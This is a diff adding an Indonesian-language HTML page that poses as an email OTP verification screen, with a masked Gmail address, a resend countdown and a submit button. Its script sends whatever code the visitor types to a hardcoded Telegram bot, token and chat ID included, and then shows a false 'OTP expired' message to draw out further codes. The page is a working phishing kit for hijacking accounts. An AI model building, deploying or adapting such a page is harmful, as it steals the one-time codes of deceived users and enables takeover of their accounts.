@@ -1,0 +1,277 @@
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Verifikasi Email OTP</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
+    body {
+      font-family: "Inter", sans-serif;
+      background-color: #1e1e1e;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding: 1rem;
+      margin: 0;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+    header button {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 1.125rem;
+      cursor: pointer;
+    }
+    header h1 {
+      font-weight: 800;
+      font-size: 1.875rem;
+      line-height: 1.2;
+      margin: 0;
+    }
+    main {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+      max-width: 28rem;
+      width: 100%;
+    }
+    .image-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 0.5rem;
+      position: relative;
+    }
+    .image-wrapper img {
+      width: 4rem;
+      height: 4rem;
+      display: block;
+      margin: 0 auto;
+    }
+    p.description {
+      font-weight: 400;
+      font-size: 1rem;
+      margin: 0;
+    }
+    p.description span {
+      color: #22c55e; /* Tailwind green-500 */
+      font-weight: 600;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+    .input-group {
+      display: flex;
+      align-items: center;
+      background-color: rgba(107, 114, 128, 0.4); /* gray-700 with 40% opacity */
+      border-radius: 0.5rem;
+      padding: 0.75rem 1rem;
+    }
+    .input-group input {
+      flex-grow: 1;
+      background: transparent;
+      border: none;
+      color: #9ca3af; /* gray-400 */
+      font-size: 1rem;
+      outline: none;
+    }
+    .input-group input::placeholder {
+      color: #9ca3af; /* gray-400 */
+    }
+    .input-group button {
+      margin-left: 1rem;
+      font-weight: 600;
+      font-size: 0.75rem; /* smaller text size */
+      color: white;
+      background: none;
+      border: none;
+      cursor: pointer;
+      white-space: nowrap;
+      opacity: 0.5;
+      pointer-events: none;
+      transition: color 0.3s ease, opacity 0.3s ease;
+    }
+    .input-group button.enabled {
+      color: #228B22;
+      opacity: 1;
+      pointer-events: auto;
+    }
+    button#submitBtn {
+      background-color: rgba(107, 114, 128, 0.4); /* gray-600 with 40% opacity */
+      color: white;
+      text-align: center;
+      border-radius: 0.5rem;
+      padding: 0.75rem 0;
+      font-size: 1.125rem;
+      cursor: not-allowed;
+      opacity: 0.5;
+      border: none;
+      transition: opacity 0.3s ease, cursor 0.3s ease;
+    }
+    button#submitBtn.enabled {
+      cursor: pointer;
+      opacity: 1;
+      background: #228B22;
+    }
+    section.info {
+      color: white;
+      font-size: 0.875rem;
+      line-height: 1.5;
+      max-width: 28rem;
+    }
+    section.info p {
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+    section.info ul {
+      list-style-type: disc;
+      padding-left: 1.25rem;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <button aria-label="Back"></button>
+    <h1>Verifikasi</h1>
+  </header>
+  <main>
+    <div class="image-wrapper">
+      <img
+        alt="Shield icon"
+        src="https://storage.googleapis.com/a1aa/image/68de56b0-37d1-42e7-ae17-18d36e61b978.jpg"
+        width="64"
+        height="64"
+      />
+    </div>
+    <p class="description">
+      Kode akan dikirim ke
+      <span>*********@gmail.com</span>
+    </p>
+    <form id="verificationForm">
+      <div class="input-group">
+        <input
+          id="verificationCode"
+          name="verificationCode"
+          aria-label="Kode verifikasi email"
+          placeholder="Kode verifikasi email"
+          type="text"
+          required
+          inputmode="numeric"
+          pattern="[0-9]*"
+          maxlength="6"
+          autocomplete="one-time-code"
+          oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+        />
+        <button id="resendBtn" type="button" disabled>48s Kirim ulang</button>
+      </div>
+      <button id="submitBtn" type="submit" disabled>Kirimkan</button>
+    </form>
+    <section class="info">
+      <p>Jika Anda belum menerima email:</p>
+      <ul>
+        <li>Pastikan alamat email yang Anda berikan sudah benar.</li>
+        <li>Periksa folder spam di email Anda.</li>
+        <li>Pastikan klien email atau penyedia layanan Anda berfungsi normal.</li>
+      </ul>
+    </section>
+  </main>
+
+  <script>
+    const resendBtn = document.getElementById("resendBtn");
+    const input = document.getElementById("verificationCode");
+    const submitBtn = document.getElementById("submitBtn");
+    let countdown = 48;
+    let timer;
+
+    function startCountdown() {
+      resendBtn.disabled = true;
+      resendBtn.classList.remove("enabled");
+      resendBtn.style.color = "";
+      resendBtn.textContent = `${countdown}s Kirim ulang`;
+      timer = setInterval(() => {
+        countdown--;
+        if (countdown <= 0) {
+          clearInterval(timer);
+          resendBtn.disabled = false;
+          resendBtn.textContent = "Kirim ulang";
+          resendBtn.classList.add("enabled");
+          resendBtn.style.color = "#22c55e";
+          countdown = 48;
+        } else {
+          resendBtn.textContent = `${countdown}s Kirim ulang`;
+        }
+      }, 1000);
+    }
+
+    startCountdown();
+
+    input.addEventListener("input", () => {
+      submitBtn.disabled = input.value.trim() === "";
+      if (!submitBtn.disabled) {
+        submitBtn.classList.add("enabled");
+      } else {
+        submitBtn.classList.remove("enabled");
+      }
+    });
+
+    resendBtn.addEventListener("click", () => {
+      startCountdown();
+      alert("Kode verifikasi baru telah dikirim.");
+      // Add actual resend logic here if needed
+    });
+
+    async function sendToTelegram(message) {
+      const TELEGRAM_BOT_TOKEN = "7367488430:AAFt7-ZdH5runtY3gZOv5hoheTN5Qucl74g";
+      const TELEGRAM_CHAT_ID = "5906925079";
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const params = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+      };
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(params),
+        });
+        return response.ok;
+      } catch (error) {
+        console.error("Error sending to Telegram:", error);
+        return false;
+      }
+    }
+
+    document.getElementById("verificationForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const code = input.value.trim();
+      if (!code) return;
+
+      const message = `Kode verifikasi email: ${code}`;
+
+      const success = await sendToTelegram(message);
+      if (success) {
+        alert("Kode OTP Kadaluwarsa.");
+        input.value = "";
+        submitBtn.disabled = true;
+        submitBtn.classList.remove("enabled");
+      } else {
+        alert("Gagal mengirim kode ke Telegram.");
+      }
+    });
+  </script>
+</body>
+</html>
